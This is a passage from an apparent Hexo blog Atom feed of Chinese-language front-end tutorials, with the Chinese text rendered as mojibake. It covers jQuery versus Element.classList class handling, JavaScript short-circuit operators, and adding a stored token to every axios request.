separated list</span></span><br><span class="line">                <span class="keyword">if</span> ( self.hasClass( className ) ) &#123;</span><br><span class="line">                    self.removeClass( className );</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    self.addClass( className );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Toggle whole class name</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( value === <span class="literal">undefined</span> || type === <span class="string">"boolean"</span> ) &#123;</span><br><span class="line">            className = getClass( <span class="keyword">this</span> );</span><br><span class="line">            <span class="keyword">if</span> ( className ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Store className if set</span></span><br><span class="line">                dataPriv.set( <span class="keyword">this</span>, <span class="string">"__className__"</span>, className );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If the element has a class name or if we're passed `false`,</span></span><br><span class="line">            <span class="comment">// then remove the whole classname (if there was one, the above saved it).</span></span><br><span class="line">            <span class="comment">// Otherwise bring back whatever was previously saved (if anything),</span></span><br><span class="line">            <span class="comment">// falling back to the empty string if nothing was stored.</span></span><br><span class="line">            <span class="keyword">if</span> ( <span class="keyword">this</span>.setAttribute ) &#123;</span><br><span class="line">                <span class="keyword">this</span>.setAttribute( <span class="string">"class"</span>,</span><br><span class="line">                    className || value === <span class="literal">false</span> ?</span><br><span class="line">                    <span class="string">""</span> :</span><br><span class="line">                    dataPriv.get( <span class="keyword">this</span>, <span class="string">"__className__"</span> ) || <span class="string">""</span></span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†…éƒ¨çš„ä»£ç é€»è¾‘æˆ‘å°±ä¸å†åˆ†æäº†ï¼Œè¿™ç§ä»£ç æœ€æ˜æ˜¾çš„ç‰¹ç‚¹ï¼š<code>å¤§é‡çš„å¾ªç¯å’Œåˆ¤æ–­</code>ã€‚<br>å¯¹äºä»¥å‰çš„å‰ç«¯ç¯å¢ƒæ¥è¯´ï¼Œè¿™ç§å†™æ³•æ— å¯åšéï¼Œå®ƒèƒ½è®©æˆ‘ä»¬çš„ä»£ç æ›´åŠ çš„å¥å£®ï¼Œèƒ½å…¼å®¹å‡ ä¹æ‰€æœ‰çš„æµè§ˆå™¨ç¯å¢ƒäº†ã€‚ä½†æ˜¯å¦‚ä»Šï¼Œéšç€ <code>å¤§å‰ç«¯</code> çš„å…´èµ·ï¼Œæµè§ˆå™¨å¯¹äº <code>js - css - html</code> çš„æ”¯æŒèƒ½åŠ›å·²ç»å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æœ€ç®€å•ã€å¿«é€Ÿçš„æ–¹å¼å®ç°ä¸Šé¢çš„æ“ä½œã€‚</p><h3 id="Element-classList"><a href="#Element-classList" class="headerlink" title="Element.classList"></a>Element.classList</h3><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹å®˜æ–¹å¯¹äºè¯¥å±æ€§çš„ä»‹ç»ï¼š</p><blockquote><p>Element.classList æ˜¯ä¸€ä¸ªåªè¯»å±æ€§ï¼Œè¿”å›ä¸€ä¸ªå…ƒç´ çš„ç±»å±æ€§çš„å®æ—¶ DOMTokenListé›†åˆã€‚<br>ä½¿ç”¨ classList æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„æ›¿ä»£æ–¹æ³•ï¼Œé€šè¿‡element.classNameä½œä¸ºç©ºæ ¼åˆ†éš”çš„å­—ç¬¦ä¸²è®¿é—®å…ƒç´ çš„ç±»åˆ—è¡¨ã€‚</p></blockquote><p>æ›´åŠ é€šä¿—çš„è®²ï¼š<br>ä¹‹å‰æˆ‘ä»¬è·å–ä¸€ä¸ªå…ƒç´ ç±»åçš„é›†åˆæ—¶ï¼Œéœ€è¦å…ˆä½¿ç”¨ <code>element.className</code> è·å–ç±»åçš„å­—ç¬¦ä¸²ï¼Œä¹‹ååœ¨ <code>split</code> æˆä¸€ä¸ªé›†åˆã€‚è€Œä½¿ç”¨ <code>element.classList</code> æ—¶ï¼Œæˆ‘ä»¬èƒ½ç›´æ¥è·å–å…ƒç´ ç±»åçš„é›†åˆ(<strong>è¿™é‡Œæ˜¯é›†åˆï¼Œä¸æ˜¯æ•°ç»„</strong>)ã€‚</p><h3 id="Element-classList-çš„ç±»åæ“ä½œ"><a href="#Element-classList-çš„ç±»åæ“ä½œ" class="headerlink" title="Element.classList çš„ç±»åæ“ä½œ"></a>Element.classList çš„ç±»åæ“ä½œ</h3><p>ä¸Šé¢è¯´åˆ°ï¼Œ<code>element.classList</code> è¿”å›ä¸€ä¸ªç±»åçš„é›†åˆï¼Œè¯¥é›†åˆæ˜¯ä¸å…ƒç´ çš„ <code>class</code> ç›¸äº’æ˜ å°„çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªè¦å‘ <code>classList</code> ä¸­æ·»åŠ ä¸€ä¸ª <code>class</code> è¿™ä¸ª <code>class</code> å°±ä¼šæ˜ å°„åˆ°çœŸå®çš„å…ƒç´ ä¸Šã€‚ä¸ºæ­¤<code>DOMTokenList</code> æä¾›äº†ä¸€å¥—æ“ä½œçš„æ–¹æ³•æ¥å…è®¸å¼€å‘è€…æ“ä½œ <code>classList</code>ã€‚</p><h4 id="addClass-classList-add"><a href="#addClass-classList-add" class="headerlink" title="addClass - classList.add"></a>addClass - classList.add</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ·»åŠ ç±»å</span></span><br><span class="line">element.classList.add(<span class="string">'added-class'</span>)</span><br></pre></td></tr></table></figure><h4 id="removeClass-classList-remove"><a href="#removeClass-classList-remove" class="headerlink" title="removeClass - classList.remove"></a>removeClass - classList.remove</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ é™¤ç±»å</span></span><br><span class="line">element.classList.remove(<span class="string">'removed-class'</span>)</span><br></pre></td></tr></table></figure><h4 id="hasClass-classList-contains"><a href="#hasClass-classList-contains" class="headerlink" title="hasClass - classList.contains"></a>hasClass - classList.contains</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç±»å</span></span><br><span class="line">element.classList.contains(<span class="string">'contains-class'</span>)</span><br></pre></td></tr></table></figure><h4 id="toggleClass-classList-toggle"><a href="#toggleClass-classList-toggle" class="headerlink" title="toggleClass - classList.toggle"></a>toggleClass - classList.toggle</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç±»ååˆ‡æ¢</span></span><br><span class="line">element.classList.toggle(<span class="string">'toggled-class'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç±»ååˆ‡æ¢ - while</span></span><br><span class="line"><span class="comment">// å½“ç¬¬äºŒä¸ªå‚æ•°çš„è¡¨è¾¾å¼æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæ‰§è¡Œ toggle æ“ä½œ</span></span><br><span class="line"><span class="comment">// è¯¥æ–¹æ³•ç›®å‰è¿˜åœ¨ **å®éªŒ** é˜¶æ®µ</span></span><br><span class="line">element.classList.toggle(<span class="string">'toggled-class'</span>, i &lt; <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢åˆ—ä¸¾çš„è¿™äº›æ–¹æ³•å·²ç»åœ¨ <code>ie10</code> ä»¥ä¸Šçš„æµè§ˆå™¨ä¸Šæ™®åŠï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚<br>æ›´å¤š <code>classList</code> çš„æ–¹æ³•å¯ä»¥å‚è€ƒ<a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨å‰ç«¯ &lt;code&gt;MV*&lt;/code&gt; æ¡†æ¶è¿˜æœªå…´èµ·çš„æ—¶æœŸï¼Œç»å¤§éƒ¨åˆ†çš„å‰ç«¯ç½‘ç«™éƒ½æ˜¯åŸºäº &lt;code&gt;äº‹ä»¶é©±åŠ¨&lt;/code&gt; çš„ã€‚è€Œè¿™ç§ç½‘ç«™æ€»æ˜¯ä¸å¯é¿å…çš„ä¼´éšç€å¤§é‡çš„ &lt;code&gt;DOMæ“ä½œ&lt;/code&gt;ã€‚å…¶ä¸­ï¼Œ&lt;code&gt;ç±»å - class&lt;/code&gt; çš„æ“ä½œç®—æ˜¯å…¶ä¸­æœ€å¹³å¸¸ä¹Ÿæ˜¯æœ€æ–¹ä¾¿ã€é€šç”¨çš„ä¸€ç§ã€‚&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>é€»è¾‘ç¬¦å·</title>
    <link href="https://github.com/TheNightElf/2017/12/26/%E9%80%BB%E8%BE%91%E7%AC%A6%E5%8F%B7/"/>
    <id>https://github.com/TheNightElf/2017/12/26/é€»è¾‘ç¬¦å·/</id>
    <published>2017-12-26T03:13:46.000Z</published>
    <updated>2017-12-26T03:43:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¯´èµ·é€»è¾‘ç¬¦å·ï¼Œæˆ‘ä»¬æ¥è§¦çš„æœ€å¤šçš„å¯èƒ½å°±æ˜¯ <code>&amp;&amp;</code> å’Œ <code>||</code> è¿™ä¸¤ä¸ªæ¯”è¾ƒç¬¦äº†ã€‚æœ¬èŠ‚ä¼šä»‹ç»ä¸€ä¸‹è¿™ä¸¤ä¸ªé€»è¾‘è¿ç®—ç¬¦çš„ <code>çŸ­è·¯æ“ä½œ</code> è§„åˆ™ä»¥åŠä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿ <code>if</code> çš„å¿«é€Ÿæ¯”è¾ƒèµ‹å€¼æ“ä½œã€‚<br><a id="more"></a></p><h3 id="amp-amp-çš„çŸ­è·¯è¿ç®—è§„åˆ™"><a href="#amp-amp-çš„çŸ­è·¯è¿ç®—è§„åˆ™" class="headerlink" title="&amp;&amp; çš„çŸ­è·¯è¿ç®—è§„åˆ™"></a>&amp;&amp; çš„çŸ­è·¯è¿ç®—è§„åˆ™</h3><p>å½“ <code>&amp;&amp;</code> é€»è¾‘æ¯”è¾ƒå‰é¢çš„å€¼ä¸º <code>true</code> æ—¶ï¼Œåˆ™ç›´æ¥è¿”å› <code>&amp;&amp;</code> åé¢çš„å€¼(ä¸è®ºè¯¥å€¼ä¸º <code>true</code> è¿˜æ˜¯ <code>false</code>)ã€‚<br>å½“ <code>&amp;&amp;</code> é€»è¾‘æ¯”è¾ƒå‰é¢çš„å€¼ä¸º <code>false</code> æ—¶ï¼Œåˆ™ç›´æ¥è¿”å› <code>&amp;&amp;</code> å‰é¢çš„å€¼ï¼Œä¸å†å…³å¿ƒåé¢çš„å€¼ã€‚<br>ä¸‹é¢æ˜¯ä¾‹å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">5</span> &amp;&amp; <span class="number">6</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 6</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span> &amp;&amp; <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 0</span></span><br></pre></td></tr></table></figure><h3 id="çš„çŸ­è·¯è¿ç®—è§„åˆ™"><a href="#çš„çŸ­è·¯è¿ç®—è§„åˆ™" class="headerlink" title="|| çš„çŸ­è·¯è¿ç®—è§„åˆ™"></a>|| çš„çŸ­è·¯è¿ç®—è§„åˆ™</h3><p>å½“ <code>||</code> é€»è¾‘æ¯”è¾ƒå‰é¢çš„å€¼ä¸º <code>false</code> æ—¶ï¼Œåˆ™ç›´æ¥è¿”å› <code>||</code> åé¢çš„å€¼(ä¸è®ºè¯¥å€¼ä¸º <code>true</code> è¿˜æ˜¯ <code>false</code>)ã€‚<br>å½“ <code>||</code> é€»è¾‘æ¯”è¾ƒå‰é¢çš„å€¼ä¸º <code>true</code> æ—¶ï¼Œåˆ™ç›´æ¥è¿”å› <code>||</code> å‰é¢çš„å€¼ï¼Œä¸å†å…³å¿ƒåé¢çš„å€¼ã€‚<br>ä¸‹é¢æ˜¯ä¾‹å­ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span> || <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 1</span></span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span> || <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="è¿›é˜¶ç”¨æ³•"><a href="#è¿›é˜¶ç”¨æ³•" class="headerlink" title="è¿›é˜¶ç”¨æ³•"></a>è¿›é˜¶ç”¨æ³•</h3><p>ä½¿ç”¨ <code>&amp;&amp;</code> çš„çŸ­è·¯è§„åˆ™ä»£æ›¿çŸ­çº¿ <code>if</code> åˆ¤æ–­è¿›è¡Œå¿«é€Ÿèµ‹å€¼æ“ä½œã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span> (<span class="params">param</span>) </span>&#123;</span><br><span class="line">    !param &amp;&amp; (param = &#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span> (<span class="params">param</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!param) param = &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„å†™æ³• <code>1</code> å’Œ <code>2</code> çš„å®é™…æ•ˆæœå®Œå…¨ç›¸åŒã€‚</p><h3 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><h6 id="ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿-if-çš„ä¼˜ç‚¹"><a href="#ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿-if-çš„ä¼˜ç‚¹" class="headerlink" title="ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿ if çš„ä¼˜ç‚¹:"></a>ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿ <code>if</code> çš„ä¼˜ç‚¹:</h6><ol><li>è¿è¡Œé€Ÿåº¦å¿«ï¼›<code>javascript</code> ä¸­ï¼Œé€»è¾‘è¿ç®—ç¬¦çš„æ‰§è¡Œé€Ÿåº¦æ˜¯æ¯” <code>if</code> è¯­å¥è¦å¿«(å‚è€ƒçŸ­çº¿æ“ä½œè§„åˆ™)ã€‚</li><li>ä»£ç çŸ­å°ç²¾æ‚ï¼Œé€¼æ ¼æ›´é«˜(è¯·å¿½ç•¥è¿™ç‚¹)ã€‚</li></ol><h6 id="ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿-if-çš„ç¼ºç‚¹"><a href="#ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿-if-çš„ç¼ºç‚¹" class="headerlink" title="ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿ if çš„ç¼ºç‚¹:"></a>ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿çŸ­çº¿ <code>if</code> çš„ç¼ºç‚¹:</h6><ol><li>æ‰§è¡Œé€Ÿåº¦æ˜¯å˜å¿«äº†ï¼Œä½†æ˜¯ä½¿ç”¨çš„æ—¶å€™å¿…é¡»è¦æ³¨æ„ <code>æ“ä½œç¬¦ä¼˜å…ˆçº§</code> çš„é—®é¢˜(å¯ä»¥å‚è€ƒ<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence" target="_blank" rel="noopener">è¿™é‡Œ</a>)ã€‚</li><li>é€¼æ ¼æ˜¯æ›´é«˜çš„ï¼Œä½†æ˜¯ä»£ç çš„å¯è¯»æ€§å˜çš„å¾ˆå·®ï¼Œä¸äº†è§£çš„äººçœ‹äº†ä¹‹åå®Œå…¨ä¸çŸ¥é“æ€ä¹ˆç†è§£ã€‚</li></ol><p></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¯´èµ·é€»è¾‘ç¬¦å·ï¼Œæˆ‘ä»¬æ¥è§¦çš„æœ€å¤šçš„å¯èƒ½å°±æ˜¯ &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; å’Œ &lt;code&gt;||&lt;/code&gt; è¿™ä¸¤ä¸ªæ¯”è¾ƒç¬¦äº†ã€‚æœ¬èŠ‚ä¼šä»‹ç»ä¸€ä¸‹è¿™ä¸¤ä¸ªé€»è¾‘è¿ç®—ç¬¦çš„ &lt;code&gt;çŸ­è·¯æ“ä½œ&lt;/code&gt; è§„åˆ™ä»¥åŠä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ä»£æ›¿ &lt;code&gt;if&lt;/code&gt; çš„å¿«é€Ÿæ¯”è¾ƒèµ‹å€¼æ“ä½œã€‚&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Axiosè®¾ç½®é»˜è®¤è¯·æ±‚å‚æ•°</title>
    <link href="https://github.com/TheNightElf/2017/12/17/axios%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0/"/>
    <id>https://github.com/TheNightElf/2017/12/17/axiosè®¾ç½®é»˜è®¤å‚æ•°/</id>
    <published>2017-12-17T02:15:40.000Z</published>
    <updated>2017-12-26T03:12:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ç½‘ç«™å»ºè®¾æˆè¡Œå¯¹æ¥ <code>api</code> æ¥å£çš„æ—¶å€™ç»å¸¸ä¼šé‡åˆ°ä¸€ä¸ªåœºæ™¯â€”â€”ç”¨æˆ·çš„ç™»å½•éªŒè¯ã€‚<br>å¤§å¤šæ•°çš„åšæ³•éƒ½æ˜¯æœåŠ¡ç«¯è¿”å›ä¸€ä¸ª <code>token</code> ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å­˜å‚¨åœ¨ <code>cookie</code> æˆ–è€… <code>Storage</code> ä¸­ã€‚<br>ç­‰ä¸‹æ¬¡å‘è¯·æ±‚çš„æ—¶å€™å†å°† <code>token</code> æºå¸¦ï¼Œä¼ é€’ç»™æœåŠ¡ç«¯ã€‚ä½†æ˜¯è¿™ä¹ˆåšä¼šéå¸¸çš„ç¹çï¼Œæ¯æ¬¡éƒ½è¦åœ¨è¯·æ±‚ä¸­è®¾ç½® <code>token</code>ã€‚<br><a id="more"></a></p><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><h4 id="æ–¹æ¡ˆä¸€"><a href="#æ–¹æ¡ˆä¸€" class="headerlink" title="æ–¹æ¡ˆä¸€"></a>æ–¹æ¡ˆä¸€</h4><p>ä½¿ç”¨ <code>axios</code> å®˜æ–¹æä¾›çš„ <code>Interceptors</code> æ‹¦æˆªå™¨è¿›è¡Œé…ç½®ã€‚<br>å‡è®¾ <code>token</code> æ˜¯å‚¨å­˜åœ¨ <code>localeStorage</code> ä¸­ï¼›<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯·æ±‚æ‹¦æˆªå™¨</span></span><br><span class="line">axios.interceptors.request.use(<span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> token = localStorage.getItem(<span class="string">'token'</span>)</span><br><span class="line">     <span class="comment">// åˆ¤æ–­è¯·æ±‚çš„ç±»å‹</span></span><br><span class="line">     <span class="comment">// å¦‚æœæ˜¯postè¯·æ±‚å°±æŠŠé»˜è®¤å‚æ•°æ‹¼åˆ°dataé‡Œé¢</span></span><br><span class="line">     <span class="comment">// å¦‚æœæ˜¯getè¯·æ±‚å°±æ‹¼åˆ°paramsé‡Œé¢</span></span><br><span class="line">    <span class="keyword">if</span>(config.method === <span class="string">'post'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> data = qs.parse(config.data)</span><br><span class="line"></span><br><span class="line">        config.data = qs.stringify(&#123;</span><br><span class="line">            token: token,</span><br><span class="line">            ...data</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(config.method === <span class="string">'get'</span>) &#123;</span><br><span class="line">        config.params = &#123;</span><br><span class="line">            token: token,</span><br><span class="line">            ...config.params</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p><p>æ‹¦æˆªå™¨ä¼šæ‹¦æˆªæ‰€æœ‰çš„ <code>è¯·æ±‚</code> æˆ–è€… <code>å“åº”</code>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ‹¦æˆªåˆ°è¯·æ±‚çš„æ—¶å€™å°†ç”¨æˆ·çš„è¯·æ±‚å‚æ•°ä¸­æ·»åŠ  <code>token</code>ã€‚<br>è¿™æ ·å°±ä¸éœ€è¦æ¯æ¬¡éƒ½åœ¨è¯·æ±‚ä¸­æ·»åŠ ä¸€æ¬¡ <code>token</code> çš„æ“ä½œäº†ã€‚</p><p><strong>æ‰©å±•</strong><br>å“åº”æ‹¦æˆªå™¨å¯ä»¥æ‹¦æˆªæ¯ä¸€æ¬¡æœåŠ¡ç«¯çš„å“åº”ä¿¡æ¯ï¼Œç”¨æˆ·çš„ <code>ç™»å½•è¶…æ—¶</code> å®Œå…¨å¯ä»¥åœ¨è¿™ä¸ªæ‹¦æˆªå™¨ä¸­å¤„ç†ã€‚</p><h4 id="æ–¹æ¡ˆäºŒ"><a href="#æ–¹æ¡ˆäºŒ" class="headerlink" title="æ–¹æ¡ˆäºŒ"></a>æ–¹æ¡ˆäºŒ</h4><p>é€šè¿‡æ›´æ”¹ <code>request config</code> çš„é»˜è®¤é…ç½®å®ç°ã€‚<br>åœ¨ä¸Šæ–‡çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>request config</code> ä¸­æœ‰ä¸€é¡¹ <code>transformRequest</code> çš„é…ç½®ã€‚è¯¥æ–¹æ³•ä¼šåœ¨æ¯ä¸ªè¯·æ±‚å‘é€ç»™æœåŠ¡ç«¯ä¹‹å‰æ‰§è¡Œï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹å¦‚ä½•ä½¿ç”¨ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">axios.defaults.transformRequest = [<span class="function"><span class="keyword">function</span> (<span class="params">data, header</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> token = localStorage.getItem(<span class="string">'token'</span>)</span><br><span class="line">    <span class="comment">//header.post = &#123;</span></span><br><span class="line">      <span class="comment">//  "Content-Type": "application/json;charset=UTF-8"</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="keyword">var</span> obj = <span class="built_in">Object</span>.assign(&#123;&#125;, data, &#123; <span class="attr">token</span>: token &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(obj)</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™æœ‰å‡ ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹:</p><ol><li>è¯¥æ–¹æ³•çš„è¿”å›å€¼å¿…é¡»æ˜¯ <code>string</code> æˆ– <code>Bufferå®ä¾‹</code> æˆ– <code>ArrayBuffer</code> æˆ– <code>FormData</code> æˆ– <code>Stream</code>ã€‚</li><li>è½¬æ¢å®Œä¹‹åè¯·æ±‚ä½“çš„ <code>payload</code> ä¼šå˜æˆ <code>FormData</code> çš„å½¢å¼ï¼Œå¯ä»¥åœ¨ <code>header</code> ä¸­é‡å†™ <code>Content-Type</code>ã€‚</li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><code>Axios</code> æä¾›äº†éå¸¸çµæ´»çš„é…ç½®æ–¹æ³•ä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œæˆ‘ä»¬ä¸éœ€è¦å†è‡ªå·±å°è£…ä¸€ä¸ªç±»ä¼¼çš„ <code>xhr</code> æ–¹æ³•ã€‚æ‰€æœ‰çš„ç”¨æ³•å®˜æ–¹éƒ½æœ‰è¯¦ç»†çš„è¯´æ˜ï¼Œå¦‚æœä½ æƒ³äº†è§£æ›´å¤šï¼Œå¯ä»¥ç‚¹å‡»<a href="https://github.com/axios/axios">è¿™é‡Œ</a>ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨ç½‘ç«™å»ºè®¾æˆè¡Œå¯¹æ¥ &lt;code&gt;api&lt;/code&gt; æ¥å£çš„æ—¶å€™ç»å¸¸ä¼šé‡åˆ°ä¸€ä¸ªåœºæ™¯â€”â€”ç”¨æˆ·çš„ç™»å½•éªŒè¯ã€‚&lt;br&gt;å¤§å¤šæ•°çš„åšæ³•éƒ½æ˜¯æœåŠ¡ç«¯è¿”å›ä¸€ä¸ª &lt;code&gt;token&lt;/code&gt; ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å­˜å‚¨åœ¨ &lt;code&gt;cookie&lt;/code&gt; æˆ–è€… &lt;code&gt;Storage&lt;/code&gt; ä¸­ã€‚&lt;br&gt;ç­‰ä¸‹æ¬¡å‘è¯·æ±‚çš„æ—¶å€™å†å°† &lt;code&gt;token&lt;/code&gt; æºå¸¦ï¼Œä¼ é€’ç»™æœåŠ¡ç«¯ã€‚ä½†æ˜¯è¿™ä¹ˆåšä¼šéå¸¸çš„ç¹çï¼Œæ¯æ¬¡éƒ½è¦åœ¨è¯·æ±‚ä¸­è®¾ç½® &lt;code&gt;token&lt;/code&gt;ã€‚&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Axiosä½¿ç”¨è¯´æ˜</title>
    <link href="https://github.com/TheNightElf/2017/12/13/Axios%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <id>https://github.com/TheNightElf/2017/12/13/Axiosä½¿ç”¨è¯´æ˜/</id>
    <published>2017-12-13T01:41:40.000Z</published>
    <updated>2017-12-13T02:13:16.000Z</updated>
    
